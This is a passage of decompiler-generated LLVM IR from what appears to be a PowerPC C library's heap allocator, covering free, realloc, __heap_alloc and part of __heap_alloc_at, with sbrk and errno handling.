  %v1_1000f894 = call i32 @__GI_sbrk(i32 %v2_1000f890)
  br label %dec_label_pc_1000f898

dec_label_pc_1000f898:                            ; preds = %dec_label_pc_1000f880, %dec_label_pc_1000f860, %dec_label_pc_1000f890
  %v0_1000f8a0 = call i32 @__pthread_return_0()
  %v0_1000f8a4 = load i32, i32* @r30, align 4
  %v3_1000f8a4 = icmp eq i32 %v0_1000f8a4, -1
  br i1 %v3_1000f8a4, label %dec_label_pc_1000f908, label %dec_label_pc_1000f8ec

dec_label_pc_1000f8ec:                            ; preds = %dec_label_pc_1000f898
  store i32 ptrtoint (i32* @global_var_1002e840.635 to i32), i32* @r28, align 4
  store i32 ptrtoint (i32* @global_var_100285a0 to i32), i32* @r29, align 4
  %v0_1000f8c0 = call i32 @__pthread_return_0()
  %v0_1000f8c4 = load i32, i32* @r31, align 4
  %v0_1000f8c8 = load i32, i32* @r30, align 4
  %v0_1000f8cc = load i32, i32* @r29, align 4
  store i32 268499156, i32* @lr, align 4
  %v3_1000f8d0 = inttoptr i32 %v0_1000f8cc to i32*
  %v4_1000f8d0 = call i32 @__heap_free(i32* %v3_1000f8d0, i32 %v0_1000f8c8, i32 %v0_1000f8c4)
  %v0_1000f8d4 = load i32, i32* @r29, align 4
  %v2_1000f8dc = inttoptr i32 %v0_1000f8d4 to i32*
  %v3_1000f8dc = call i32 @__heap_alloc(i32* %v2_1000f8dc, i32 %v2_1000f81c)
  store i32 %v3_1000f8dc, i32* %r31.global-to-local, align 4
  %v0_1000f8e8 = call i32 @__pthread_return_0()
  %v3_1000f8ec = icmp eq i32 %v3_1000f8dc, 0
  br i1 %v3_1000f8ec, label %dec_label_pc_1000f900.thread, label %dec_label_pc_1000f900

dec_label_pc_1000f900.thread:                     ; preds = %dec_label_pc_1000f8ec
  br label %dec_label_pc_1000f908

dec_label_pc_1000f900:                            ; preds = %dec_label_pc_1000f8ec, %dec_label_pc_1000f8ec.thread
  %v0_1000f900.pr6 = phi i32 [ %v3_1000f824, %dec_label_pc_1000f8ec.thread ], [ %v3_1000f8dc, %dec_label_pc_1000f8ec ]
  %v3_1000f8f4 = load i32, i32* %stack_var_-40, align 4
  %v2_1000f8f8 = inttoptr i32 %v0_1000f900.pr6 to i32*
  store i32 %v3_1000f8f4, i32* %v2_1000f8f8, align 4
  %v0_1000f8fc = load i32, i32* %r31.global-to-local, align 4
  %v1_1000f8fc = add i32 %v0_1000f8fc, 4
  store i32 %v1_1000f8fc, i32* @r31, align 4
  %v3_1000f900 = icmp eq i32 %v1_1000f8fc, 0
  br i1 %v3_1000f900, label %dec_label_pc_1000f908, label %dec_label_pc_1000f918

dec_label_pc_1000f908:                            ; preds = %dec_label_pc_1000f900.thread, %dec_label_pc_1000f900, %dec_label_pc_1000f898, %dec_label_pc_1000f7f4
  %v0_1000f908 = call i32 @__errno_location()
  %v2_1000f910 = inttoptr i32 %v0_1000f908 to i32*
  store i32 12, i32* %v2_1000f910, align 4
  store i32 0, i32* @r31, align 4
  br label %dec_label_pc_1000f918

dec_label_pc_1000f918:                            ; preds = %dec_label_pc_1000f900, %dec_label_pc_1000f908
  %v0_1000f91c = phi i32 [ %v1_1000f8fc, %dec_label_pc_1000f900 ], [ 0, %dec_label_pc_1000f908 ]
  ret i32 %v0_1000f91c

; uselistorder directives
  uselistorder i32 %v1_1000f8fc, { 1, 0, 2 }
  uselistorder i32 %v1_1000f884, { 1, 0, 2 }
  uselistorder i32 %v1_1000f874, { 1, 0, 2, 3 }
  uselistorder i32 %v3_1000f840, { 1, 0, 2, 3 }
  uselistorder i32 %v3_1000f824, { 1, 0, 2 }
  uselistorder i32* %stack_var_-40, { 0, 1, 3, 2 }
  uselistorder i32* %r31.global-to-local, { 4, 0, 2, 1, 3, 5 }
  uselistorder label %dec_label_pc_1000f918, { 1, 0 }
  uselistorder label %dec_label_pc_1000f908, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1000f898, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000f860, { 1, 0 }
  uselistorder label %dec_label_pc_1000f7f4, { 1, 0 }
}

define i32 @free() local_unnamed_addr {
entry:
  %v0_1000f930 = load i32, i32* @r3, align 4
  %v3_1000f930 = icmp eq i32 %v0_1000f930, 0
  br i1 %v3_1000f930, label %dec_label_pc_1000fa1c, label %dec_label_pc_1000f948

dec_label_pc_1000f948:                            ; preds = %entry
  %v1_1000f94c = add i32 %v0_1000f930, -4
  %v2_1000f94c = inttoptr i32 %v1_1000f94c to i32*
  %v3_1000f94c = load i32, i32* %v2_1000f94c, align 4
  store i32 %v3_1000f94c, i32* @r28, align 4
  store i32 268632064, i32* @r26, align 4
  %v0_1000f960 = call i32 @__pthread_return_0()
  %v0_1000f968 = load i32, i32* @r28, align 4
  store i32 268499316, i32* @lr, align 4
  %v4_1000f970 = call i32 @__heap_free(i32* nonnull @global_var_100285a0, i32 %v1_1000f94c, i32 %v0_1000f968)
  %v3_1000f978 = load i32, i32* @global_var_10028600.581, align 4
  store i32 %v4_1000f970, i32* @r29, align 4
  %v1_1000f980 = inttoptr i32 %v4_1000f970 to i32*
  %v2_1000f980 = load i32, i32* %v1_1000f980, align 4
  store i32 %v2_1000f980, i32* @r27, align 4
  %v1_1000f984 = mul i32 %v3_1000f978, 8
  %v2_1000f988 = icmp ult i32 %v2_1000f980, %v1_1000f984
  br i1 %v2_1000f988, label %dec_label_pc_1000f9bc, label %dec_label_pc_1000f990

dec_label_pc_1000f990:                            ; preds = %dec_label_pc_1000f948
  store i32 ptrtoint (i32* @global_var_1002e8f0.638 to i32), i32* @r28, align 4
  %v0_1000f9a0 = call i32 @__pthread_return_0()
  store i32 268499372, i32* @lr, align 4
  %v1_1000f9a8 = call i32 @__GI_sbrk(i32 0)
  %v0_1000f9ac = load i32, i32* @r31, align 4
  %v4_1000f9ac = icmp eq i32 %v0_1000f9ac, %v1_1000f9a8
  br i1 %v4_1000f9ac, label %dec_label_pc_1000f9c4, label %dec_label_pc_1000f9b4

dec_label_pc_1000f9b4:                            ; preds = %dec_label_pc_1000f990
  %v0_1000f9b8 = call i32 @__pthread_return_0()
  br label %dec_label_pc_1000f9bc

dec_label_pc_1000f9bc:                            ; preds = %dec_label_pc_1000f948, %dec_label_pc_1000f9b4
  br label %dec_label_pc_1000fa18

dec_label_pc_1000f9c4:                            ; preds = %dec_label_pc_1000f990
  %v0_1000f9c4 = load i32, i32* @r29, align 4
  %v1_1000f9c4 = add i32 %v0_1000f9c4, 4
  %v2_1000f9c4 = inttoptr i32 %v1_1000f9c4 to i32*
  %v3_1000f9c4 = load i32, i32* %v2_1000f9c4, align 4
  %v3_1000f9c8 = icmp eq i32 %v3_1000f9c4, 0
  br i1 %v3_1000f9c8, label %dec_label_pc_1000f9d8, label %dec_label_pc_1000f9d0

dec_label_pc_1000f9d0:                            ; preds = %dec_label_pc_1000f9c4
  %v1_1000f9d0 = add i32 %v0_1000f9c4, 8
  %v2_1000f9d0 = inttoptr i32 %v1_1000f9d0 to i32*
  %v3_1000f9d0 = load i32, i32* %v2_1000f9d0, align 4
  %v2_1000f9d4 = add i32 %v3_1000f9c4, 8
  %v3_1000f9d4 = inttoptr i32 %v2_1000f9d4 to i32*
  store i32 %v3_1000f9d0, i32* %v3_1000f9d4, align 4
  %v0_1000f9d8.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000f9d8

dec_label_pc_1000f9d8:                            ; preds = %dec_label_pc_1000f9c4, %dec_label_pc_1000f9d0
  %v0_1000f9d8 = phi i32 [ %v0_1000f9c4, %dec_label_pc_1000f9c4 ], [ %v0_1000f9d8.pre, %dec_label_pc_1000f9d0 ]
  %v1_1000f9d8 = add i32 %v0_1000f9d8, 8
  %v2_1000f9d8 = inttoptr i32 %v1_1000f9d8 to i32*
  %v3_1000f9d8 = load i32, i32* %v2_1000f9d8, align 4
  %v1_1000f9dc = add i32 %v0_1000f9d8, 4
  %v2_1000f9dc = inttoptr i32 %v1_1000f9dc to i32*
  %v3_1000f9dc = load i32, i32* %v2_1000f9dc, align 4
  %v3_1000f9e0 = icmp eq i32 %v3_1000f9d8, 0
  br i1 %v3_1000f9e0, label %dec_label_pc_1000f9f0, label %dec_label_pc_1000f9e8

dec_label_pc_1000f9e8:                            ; preds = %dec_label_pc_1000f9d8
  %v2_1000f9e8 = add i32 %v3_1000f9d8, 4
  %v3_1000f9e8 = inttoptr i32 %v2_1000f9e8 to i32*
  store i32 %v3_1000f9dc, i32* %v3_1000f9e8, align 4
  br label %dec_label_pc_1000f9f4

dec_label_pc_1000f9f0:                            ; preds = %dec_label_pc_1000f9d8
  store i32 %v3_1000f9dc, i32* @global_var_100285a0, align 4
  br label %dec_label_pc_1000f9f4

dec_label_pc_1000f9f4:                            ; preds = %dec_label_pc_1000f9e8, %dec_label_pc_1000f9f0
  %v0_1000f9fc = call i32 @__pthread_return_0()
  %v0_1000fa00 = load i32, i32* @r27, align 4
  %v1_1000fa00 = load i32, i32* @r29, align 4
  %v0_1000fa08 = load i32, i32* @r31, align 4
  %v2_1000fa00 = sub i32 12, %v0_1000fa00
  %v1_1000fa04 = add i32 %v2_1000fa00, %v1_1000fa00
  %v2_1000fa08 = sub i32 %v1_1000fa04, %v0_1000fa08
  store i32 268499472, i32* @lr, align 4
  %v1_1000fa0c = call i32 @__GI_sbrk(i32 %v2_1000fa08)
  br label %dec_label_pc_1000fa18

dec_label_pc_1000fa18:                            ; preds = %dec_label_pc_1000f9bc, %dec_label_pc_1000f9f4
  %v0_1000fa18 = call i32 @__pthread_return_0()
  br label %dec_label_pc_1000fa1c

dec_label_pc_1000fa1c:                            ; preds = %entry, %dec_label_pc_1000fa18
  %.0 = phi i32 [ undef, %entry ], [ %v0_1000fa18, %dec_label_pc_1000fa18 ]
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v0_1000f9d8, { 1, 0 }
  uselistorder i32 undef, { 0, 2, 1, 3 }
  uselistorder i32 (i32)* @__GI_sbrk, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1000fa1c, { 1, 0 }
  uselistorder label %dec_label_pc_1000fa18, { 1, 0 }
  uselistorder label %dec_label_pc_1000f9f4, { 1, 0 }
  uselistorder label %dec_label_pc_1000f9d8, { 1, 0 }
  uselistorder label %dec_label_pc_1000f9bc, { 1, 0 }
}

define i32 @realloc(i32 %arg1) local_unnamed_addr {
entry:
  %r27.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_1000fa30 = load i32, i32* @r4, align 4
  %v3_1000fa30 = icmp eq i32 %v0_1000fa30, 0
  store i32 %arg1, i32* @r28, align 4
  br i1 %v3_1000fa30, label %dec_label_pc_1000fa4c, label %dec_label_pc_1000fa58

dec_label_pc_1000fa4c:                            ; preds = %entry
  store i32 ptrtoint ([3 x i8]* @global_var_1000fa50.641 to i32), i32* @lr, align 4
  %v0_1000fa4c = call i32 @free()
  br label %dec_label_pc_1000fa64

dec_label_pc_1000fa58:                            ; preds = %entry
  %v3_1000fa58 = icmp eq i32 %arg1, 0
  br i1 %v3_1000fa58, label %dec_label_pc_1000fa64, label %dec_label_pc_1000fa70

dec_label_pc_1000fa64:                            ; preds = %dec_label_pc_1000fa58, %dec_label_pc_1000fa4c
  %storemerge = phi i32 [ 0, %dec_label_pc_1000fa4c ], [ %v0_1000fa30, %dec_label_pc_1000fa58 ]
  store i32 %storemerge, i32* @r3, align 4
  store i32 268499560, i32* @lr, align 4
  %v0_1000fa64 = call i32 @malloc()
  store i32 %v0_1000fa64, i32* @r28, align 4
  br label %dec_label_pc_1000fb48

dec_label_pc_1000fa70:                            ; preds = %dec_label_pc_1000fa58
  %v1_1000fa70 = add i32 %v0_1000fa30, 7
  %v1_1000fa74 = add i32 %arg1, -4
  store i32 %v1_1000fa74, i32* %r27.global-to-local, align 4
  %v1_1000fa78 = call i32 @__asm_rlwinm(i32 %v1_1000fa70, i32 0, i32 0, i32 29)
  store i32 %v1_1000fa78, i32* %r31.global-to-local, align 4
  %v2_1000fa7c = inttoptr i32 %v1_1000fa74 to i32*
  %v3_1000fa7c = load i32, i32* %v2_1000fa7c, align 4
  store i32 %v3_1000fa7c, i32* @r30, align 4
  %v2_1000fa80 = icmp ugt i32 %v1_1000fa78, 11
  br i1 %v2_1000fa80, label %dec_label_pc_1000fa8c, label %dec_label_pc_1000fa88

dec_label_pc_1000fa88:                            ; preds = %dec_label_pc_1000fa70
  store i32 12, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000fa8c

dec_label_pc_1000fa8c:                            ; preds = %dec_label_pc_1000fa70, %dec_label_pc_1000fa88
  %v0_1000fb0c = phi i32 [ %v1_1000fa78, %dec_label_pc_1000fa70 ], [ 12, %dec_label_pc_1000fa88 ]
  %v3_1000fa8c = icmp ugt i32 %v0_1000fb0c, %v3_1000fa7c
  br i1 %v3_1000fa8c, label %dec_label_pc_1000fa94, label %dec_label_pc_1000fb0c

dec_label_pc_1000fa94:                            ; preds = %dec_label_pc_1000fa8c
  store i32 ptrtoint (i32* @global_var_1002e840.635 to i32), i32* @r29, align 4
  %v0_1000faa0 = call i32 @__pthread_return_0()
  %v0_1000faa8 = load i32, i32* %r27.global-to-local, align 4
  %v1_1000faa8 = load i32, i32* @r30, align 4
  %v2_1000faa8 = add i32 %v1_1000faa8, %v0_1000faa8
  %v1_1000faac = load i32, i32* %r31.global-to-local, align 4
  %v2_1000faac = sub i32 %v1_1000faac, %v1_1000faa8
  %v4_1000fab4 = call i32 @__heap_alloc_at(i32* nonnull @global_var_100285a0, i32 %v2_1000faa8, i32 %v2_1000faac)
  store i32 %v4_1000fab4, i32* %r27.global-to-local, align 4
  %v0_1000fac0 = call i32 @__pthread_return_0()
  %v3_1000fac4 = icmp eq i32 %v4_1000fab4, 0
  br i1 %v3_1000fac4, label %dec_label_pc_1000fad8, label %dec_label_pc_1000facc

dec_label_pc_1000facc:                            ; preds = %dec_label_pc_1000fa94
  %v0_1000facc = load i32, i32* @r30, align 4
  %v2_1000facc = add i32 %v0_1000facc, %v4_1000fab4
  %v1_1000fad0 = load i32, i32* @r28, align 4
  %v2_1000fad0 = add i32 %v1_1000fad0, -4
  %v3_1000fad0 = inttoptr i32 %v2_1000fad0 to i32*
  store i32 %v2_1000facc, i32* %v3_1000fad0, align 4
  br label %dec_label_pc_1000fb48

dec_label_pc_1000fad8:                            ; preds = %dec_label_pc_1000fa94
  %v0_1000fad8 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000fad8 = add i32 %v0_1000fad8, -4
  store i32 %v1_1000fad8, i32* @r3, align 4
  store i32 268499680, i32* @lr, align 4
  %v0_1000fadc = call i32 @malloc()
  store i32 %v0_1000fadc, i32* @r3, align 4
  store i32 %v0_1000fadc, i32* @r31, align 4
  %v3_1000fae0 = icmp eq i32 %v0_1000fadc, 0
  br i1 %v3_1000fae0, label %dec_label_pc_1000fae8, label %dec_label_pc_1000faf0

dec_label_pc_1000fae8:                            ; preds = %dec_label_pc_1000fad8
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_1000fb48

dec_label_pc_1000faf0:                            ; preds = %dec_label_pc_1000fad8
  %v0_1000faf0 = load i32, i32* @r28, align 4
  store i32 %v0_1000faf0, i32* @r4, align 4
  %v0_1000faf4 = load i32, i32* @r30, align 4
  %v1_1000faf4 = add i32 %v0_1000faf4, -4
  store i32 %v1_1000faf4, i32* @r5, align 4
  store i32 268499708, i32* @lr, align 4
  %v0_1000faf8 = call i32 @memcpy()
  %v0_1000fafc = load i32, i32* @r28, align 4
  store i32 %v0_1000fafc, i32* @r3, align 4
  store i32 268499716, i32* @lr, align 4
  %v0_1000fb00 = call i32 @free()
  %v0_1000fb04 = load i32, i32* @r31, align 4
  store i32 %v0_1000fb04, i32* @r28, align 4
  br label %dec_label_pc_1000fb48

dec_label_pc_1000fb0c:                            ; preds = %dec_label_pc_1000fa8c
  %v1_1000fb0c = add i32 %v0_1000fb0c, 28
  %v3_1000fb10 = icmp ugt i32 %v1_1000fb0c, %v3_1000fa7c
  br i1 %v3_1000fb10, label %dec_label_pc_1000fb48, label %dec_label_pc_1000fb18

dec_label_pc_1000fb18:                            ; preds = %dec_label_pc_1000fb0c
  store i32 ptrtoint (i32* @global_var_1002e840.635 to i32), i32* @r29, align 4
  %v0_1000fb24 = call i32 @__pthread_return_0()
  %v0_1000fb2c = load i32, i32* %r27.global-to-local, align 4
  %v1_1000fb2c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000fb2c = add i32 %v1_1000fb2c, %v0_1000fb2c
  %v1_1000fb30 = load i32, i32* @r30, align 4
  %v2_1000fb30 = sub i32 %v1_1000fb30, %v1_1000fb2c
  store i32 268499772, i32* @lr, align 4
  %v4_1000fb38 = call i32 @__heap_free(i32* nonnull @global_var_100285a0, i32 %v2_1000fb2c, i32 %v2_1000fb30)
  %v0_1000fb40 = call i32 @__pthread_return_0()
  %v0_1000fb44 = load i32, i32* @r31, align 4
  %v1_1000fb44 = load i32, i32* @r28, align 4
  %v2_1000fb44 = add i32 %v1_1000fb44, -4
  %v3_1000fb44 = inttoptr i32 %v2_1000fb44 to i32*
  store i32 %v0_1000fb44, i32* %v3_1000fb44, align 4
  br label %dec_label_pc_1000fb48

dec_label_pc_1000fb48:                            ; preds = %dec_label_pc_1000fb0c, %dec_label_pc_1000faf0, %dec_label_pc_1000fae8, %dec_label_pc_1000facc, %dec_label_pc_1000fa64, %dec_label_pc_1000fb18
  %v0_1000fb4c = load i32, i32* @r28, align 4
  ret i32 %v0_1000fb4c

; uselistorder directives
  uselistorder i32 %v1_1000fb2c, { 1, 0 }
  uselistorder i32 %v4_1000fab4, { 1, 0, 2 }
  uselistorder i32 %v1_1000faa8, { 1, 0 }
  uselistorder i32* %r31.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r27.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* @global_var_100285a0, { 0, 1, 3, 2, 4 }
  uselistorder i32 %arg1, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_1000fb48, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_1000fa8c, { 1, 0 }
}

define i32 @__heap_alloc(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v1_1000fb60 = inttoptr i32 %arg2 to i32*
  %v2_1000fb60 = load i32, i32* %v1_1000fb60, align 4
  %v1_1000fb64 = add i32 %v2_1000fb60, 3
  store i32 %v1_1000fb64, i32* %r9.global-to-local, align 4
  %v1_1000fb68 = call i32 @__asm_rlwinm(i32 %v1_1000fb64, i32 0, i32 0, i32 29)
  %v2_1000fb6c = icmp ugt i32 %v1_1000fb68, 11
  br i1 %v2_1000fb6c, label %dec_label_pc_1000fbf0.preheader, label %dec_label_pc_1000fb74

dec_label_pc_1000fb74:                            ; preds = %entry
  br label %dec_label_pc_1000fbf0.preheader

dec_label_pc_1000fbf0.preheader:                  ; preds = %entry, %dec_label_pc_1000fb74
  %storemerge20 = phi i32 [ 12, %dec_label_pc_1000fb74 ], [ %v1_1000fb68, %entry ]
  %v0_1000fbd4 = phi i32 [ 12, %dec_label_pc_1000fb74 ], [ %v1_1000fb68, %entry ]
  store i32 %storemerge20, i32* %r11.global-to-local, align 4
  %storemerge2 = load i32, i32* %arg1, align 4
  store i32 %storemerge2, i32* %r9.global-to-local, align 4
  %v3_1000fbf05 = icmp eq i32 %storemerge2, 0
  br i1 %v3_1000fbf05, label %dec_label_pc_1000fbf8, label %dec_label_pc_1000fb80

dec_label_pc_1000fb80:                            ; preds = %dec_label_pc_1000fbf0.preheader, %dec_label_pc_1000fbec
  %v0_1000fbec = phi i32 [ %storemerge, %dec_label_pc_1000fbec ], [ %storemerge2, %dec_label_pc_1000fbf0.preheader ]
  %v1_1000fb80 = inttoptr i32 %v0_1000fbec to i32*
  %v2_1000fb80 = load i32, i32* %v1_1000fb80, align 4
  store i32 %v2_1000fb80, i32* %r10.global-to-local, align 4
  %v2_1000fb84 = icmp ult i32 %v2_1000fb80, %v0_1000fbd4
  br i1 %v2_1000fb84, label %dec_label_pc_1000fbec, label %dec_label_pc_1000fb8c

dec_label_pc_1000fb8c:                            ; preds = %dec_label_pc_1000fb80
  %v1_1000fb8c = add i32 %v0_1000fbd4, 44
  %v2_1000fb90 = icmp ult i32 %v2_1000fb80, %v1_1000fb8c
  br i1 %v2_1000fb90, label %dec_label_pc_1000fb98, label %dec_label_pc_1000fbd4

dec_label_pc_1000fb98:                            ; preds = %dec_label_pc_1000fb8c
  %v1_1000fb98 = add i32 %v0_1000fbec, 4
  %v2_1000fb98 = inttoptr i32 %v1_1000fb98 to i32*
  %v3_1000fb98 = load i32, i32* %v2_1000fb98, align 4
  store i32 %v3_1000fb98, i32* %r11.global-to-local, align 4
  %v3_1000fb9c = icmp eq i32 %v3_1000fb98, 0
  br i1 %v3_1000fb9c, label %dec_label_pc_1000fbac, label %dec_label_pc_1000fba4

dec_label_pc_1000fba4:                            ; preds = %dec_label_pc_1000fb98
  %v1_1000fba4 = add i32 %v0_1000fbec, 8
  %v2_1000fba4 = inttoptr i32 %v1_1000fba4 to i32*
  %v3_1000fba4 = load i32, i32* %v2_1000fba4, align 4
  %v2_1000fba8 = add i32 %v3_1000fb98, 8
  %v3_1000fba8 = inttoptr i32 %v2_1000fba8 to i32*
  store i32 %v3_1000fba4, i32* %v3_1000fba8, align 4
  %v0_1000fbac.pre = load i32, i32* %r9.global-to-local, align 4
  %v0_1000fbc8.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000fbac

dec_label_pc_1000fbac:                            ; preds = %dec_label_pc_1000fb98, %dec_label_pc_1000fba4
  %v0_1000fbc8 = phi i32 [ %v2_1000fb80, %dec_label_pc_1000fb98 ], [ %v0_1000fbc8.pre, %dec_label_pc_1000fba4 ]
  %v0_1000fbac = phi i32 [ %v0_1000fbec, %dec_label_pc_1000fb98 ], [ %v0_1000fbac.pre, %dec_label_pc_1000fba4 ]
  %v1_1000fbac = add i32 %v0_1000fbac, 8
  %v2_1000fbac = inttoptr i32 %v1_1000fbac to i32*
  %v3_1000fbac = load i32, i32* %v2_1000fbac, align 4
  store i32 %v3_1000fbac, i32* @r8, align 4
  %v1_1000fbb0 = add i32 %v0_1000fbac, 4
  %v2_1000fbb0 = inttoptr i32 %v1_1000fbb0 to i32*
  %v3_1000fbb0 = load i32, i32* %v2_1000fbb0, align 4
  %v3_1000fbb4 = icmp eq i32 %v3_1000fbac, 0
  store i32 %v0_1000fbc8, i32* %r11.global-to-local, align 4
  br i1 %v3_1000fbb4, label %dec_label_pc_1000fbc8, label %dec_label_pc_1000fbbc

dec_label_pc_1000fbbc:                            ; preds = %dec_label_pc_1000fbac
  %v2_1000fbc0 = add i32 %v3_1000fbac, 4
  %v3_1000fbc0 = inttoptr i32 %v2_1000fbc0 to i32*
  store i32 %v3_1000fbb0, i32* %v3_1000fbc0, align 4
  br label %dec_label_pc_1000fbdc

dec_label_pc_1000fbc8:                            ; preds = %dec_label_pc_1000fbac
  store i32 %v3_1000fbb0, i32* %arg1, align 4
  br label %dec_label_pc_1000fbdc

dec_label_pc_1000fbd4:                            ; preds = %dec_label_pc_1000fb8c
  %v2_1000fbd4 = sub i32 %v2_1000fb80, %v0_1000fbd4
  store i32 %v2_1000fbd4, i32* %v1_1000fb80, align 4
  br label %dec_label_pc_1000fbdc

dec_label_pc_1000fbdc:                            ; preds = %dec_label_pc_1000fbc8, %dec_label_pc_1000fbbc, %dec_label_pc_1000fbd4
  %v0_1000fbdc = load i32, i32* %r10.global-to-local, align 4
  %v1_1000fbdc = load i32, i32* %r9.global-to-local, align 4
  %v2_1000fbdc = sub i32 %v1_1000fbdc, %v0_1000fbdc
  store i32 %v2_1000fbdc, i32* %r9.global-to-local, align 4
  %v0_1000fbe0 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_1000fbe0, i32* %v1_1000fb60, align 4
  %v0_1000fbe4 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000fbe4 = add i32 %v0_1000fbe4, 12
  ret i32 %v1_1000fbe4

dec_label_pc_1000fbec:                            ; preds = %dec_label_pc_1000fb80
  %v1_1000fbec = add i32 %v0_1000fbec, 4
  %storemerge.in = inttoptr i32 %v1_1000fbec to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r9.global-to-local, align 4
  %v3_1000fbf0 = icmp eq i32 %storemerge, 0
  br i1 %v3_1000fbf0, label %dec_label_pc_1000fbf0.dec_label_pc_1000fbf8_crit_edge, label %dec_label_pc_1000fb80

dec_label_pc_1000fbf0.dec_label_pc_1000fbf8_crit_edge: ; preds = %dec_label_pc_1000fbec
  br label %dec_label_pc_1000fbf8

dec_label_pc_1000fbf8:                            ; preds = %dec_label_pc_1000fbf0.dec_label_pc_1000fbf8_crit_edge, %dec_label_pc_1000fbf0.preheader
  ret i32 0

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_1000fbac, { 1, 0 }
  uselistorder i32 %v2_1000fb80, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_1000fbec, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v0_1000fbd4, { 1, 2, 0 }
  uselistorder i32* %r9.global-to-local, { 0, 4, 5, 2, 1, 3, 6 }
  uselistorder i32* %r11.global-to-local, { 3, 1, 2, 0 }
  uselistorder i32* %r10.global-to-local, { 1, 0, 2 }
  uselistorder i32* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_1000fbdc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000fbac, { 1, 0 }
  uselistorder label %dec_label_pc_1000fb80, { 1, 0 }
  uselistorder label %dec_label_pc_1000fbf0.preheader, { 1, 0 }
}

define i32 @__heap_alloc_at(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_1000fc00 = load i32, i32* %arg1, align 4
  store i32 %v2_1000fc00, i32* %r11.global-to-local, align 4
  store i32 %tmp, i32* @r8, align 4
  %v1_1000fc08 = add i32 %arg3, 3
  %v3_1000fc8c3 = icmp eq i32 %v2_1000fc00, 0
  br i1 %v3_1000fc8c3, label %dec_label_pc_1000fc94, label %dec_label_pc_1000fc10

dec_label_pc_1000fc10:                            ; preds = %entry, %dec_label_pc_1000fc88
  %v0_1000fc88 = phi i32 [ %v3_1000fc88, %dec_label_pc_1000fc88 ], [ %v2_1000fc00, %entry ]
  %v1_1000fc10 = inttoptr i32 %v0_1000fc88 to i32*
  %v2_1000fc10 = load i32, i32* %v1_1000fc10, align 4
  %v2_1000fc14 = sub i32 %v0_1000fc88, %v2_1000fc10
  %v1_1000fc18 = add i32 %v2_1000fc14, 12
  %v3_1000fc1c = icmp ugt i32 %v1_1000fc18, %arg2
  br i1 %v3_1000fc1c, label %dec_label_pc_1000fc88, label %dec_label_pc_1000fc24

dec_label_pc_1000fc24:                            ; preds = %dec_label_pc_1000fc10
  %v4_1000fc1c = icmp eq i32 %v1_1000fc18, %arg2
  br i1 %v4_1000fc1c, label %dec_label_pc_1000fc2c, label %dec_label_pc_1000fc94

dec_label_pc_1000fc2c:                            ; preds = %dec_label_pc_1000fc24
  %v1_1000fc2c = call i32 @__asm_rlwinm(i32 %v1_1000fc08, i32 0, i32 0, i32 29)
  %v2_1000fc30 = icmp ult i32 %v2_1000fc10, %v1_1000fc2c
  br i1 %v2_1000fc30, label %dec_label_pc_1000fc94, label %dec_label_pc_1000fc38

dec_label_pc_1000fc38:                            ; preds = %dec_label_pc_1000fc2c
  %v1_1000fc38 = add i32 %v1_1000fc2c, 44
  %v2_1000fc3c = icmp ult i32 %v2_1000fc10, %v1_1000fc38
  br i1 %v2_1000fc3c, label %dec_label_pc_1000fc44, label %dec_label_pc_1000fc78

dec_label_pc_1000fc44:                            ; preds = %dec_label_pc_1000fc38
  %v0_1000fc44 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000fc44 = add i32 %v0_1000fc44, 4
  %v2_1000fc44 = inttoptr i32 %v1_1000fc44 to i32*
  %v3_1000fc44 = load i32, i32* %v2_1000fc44, align 4
  %v3_1000fc48 = icmp eq i32 %v3_1000fc44, 0
  br i1 %v3_1000fc48, label %dec_label_pc_1000fc58, label %dec_label_pc_1000fc50

dec_label_pc_1000fc50:                            ; preds = %dec_label_pc_1000fc44
  %v1_1000fc50 = add i32 %v0_1000fc44, 8
  %v2_1000fc50 = inttoptr i32 %v1_1000fc50 to i32*
  %v3_1000fc50 = load i32, i32* %v2_1000fc50, align 4
  %v2_1000fc54 = add i32 %v3_1000fc44, 8
  %v3_1000fc54 = inttoptr i32 %v2_1000fc54 to i32*
  store i32 %v3_1000fc50, i32* %v3_1000fc54, align 4
  %v0_1000fc58.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000fc58

dec_label_pc_1000fc58:                            ; preds = %dec_label_pc_1000fc44, %dec_label_pc_1000fc50
  %v0_1000fc58 = phi i32 [ %v0_1000fc44, %dec_label_pc_1000fc44 ], [ %v0_1000fc58.pre, %dec_label_pc_1000fc50 ]
  %v1_1000fc58 = add i32 %v0_1000fc58, 8
  %v2_1000fc58 = inttoptr i32 %v1_1000fc58 to i32*
  %v3_1000fc58 = load i32, i32* %v2_1000fc58, align 4
  %v1_1000fc5c = add i32 %v0_1000fc58, 4
  %v2_1000fc5c = inttoptr i32 %v1_1000fc5c to i32*
  %v3_1000fc5c = load i32, i32* %v2_1000fc5c, align 4
